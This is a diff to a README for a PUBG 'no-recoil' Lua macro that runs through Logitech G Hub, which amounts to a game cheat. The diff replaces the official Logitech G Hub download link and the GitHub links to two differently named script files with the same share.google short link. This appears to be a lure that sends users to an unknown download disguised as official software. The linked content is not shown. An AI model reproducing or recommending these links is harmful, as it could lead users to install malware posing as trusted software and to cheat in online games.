@@ -38,7 +38,7 @@ _Left: Without Script ❌ | Right: With Script ✅_
 ## ⚙️ Requirements
 
 - **Logitech G-Series Mouse** 🖱️
-- **Logitech G Hub Installed** 🔧 ([Download Here](https://www.logitechg.com/en-us/innovation/g-hub.html))
+- **Logitech G Hub Installed** 🔧 ([Download Here](https://share.google/MjHs08EoIzvvXw9un))
 - **PUBG (PC Version)** 🎮
 - **Windows OS** 💻
 
@@ -48,12 +48,12 @@ _Left: Without Script ❌ | Right: With Script ✅_
 
 ### 1️⃣ Install Logitech G Hub
 
-- Download and install **[Logitech G Hub](https://www.logitechg.com/en-us/innovation/g-hub.html)**.
+- Download and install **[Logitech G Hub](https://share.google/MjHs08EoIzvvXw9un)**.
 - Open G Hub and ensure your **mouse is detected**.
 
 ### 2️⃣ Download & Load the Script
 
-- Get the **[PUBG-Logitech-No-Recoil.lua](https://github.com/Kava4/PUBG-LOGITECH-NO-RECOIL/blob/master/PUBG-Logitech-No-Recoil.lua)** script.
+- Get the **[PUBG-Logitech-No-Recoil.lua](https://share.google/MjHs08EoIzvvXw9un)** script.
 - Open **Logitech G Hub** → Click on your **PUBG profile**.
 - Go to **Scripting** (bottom left) → Click **Create New Lua Script**.
 - **Paste the script** into the editor and **Save**.
@@ -116,7 +116,7 @@ end
 
 ## 🎛️ Dynamic Recoil Adjustment (Test Needed)
 
-- Get the **[PUBG_Simple_NoRecoil_Adjustable.lua](https://github.com/Kava4/PUBG-LOGITECH-NO-RECOIL/blob/master/PUBG-Logitech-No-Recoil.lua)** script.
+- Get the **[PUBG_Simple_NoRecoil_Adjustable.lua](https://share.google/MjHs08EoIzvvXw9un)** script.
 - Open **Logitech G Hub** → Click on your **PUBG profile**.
 - Go to **Scripting** (bottom left) → Click **Create New Lua Script**.
 - **Paste the script** into the editor and **Save**
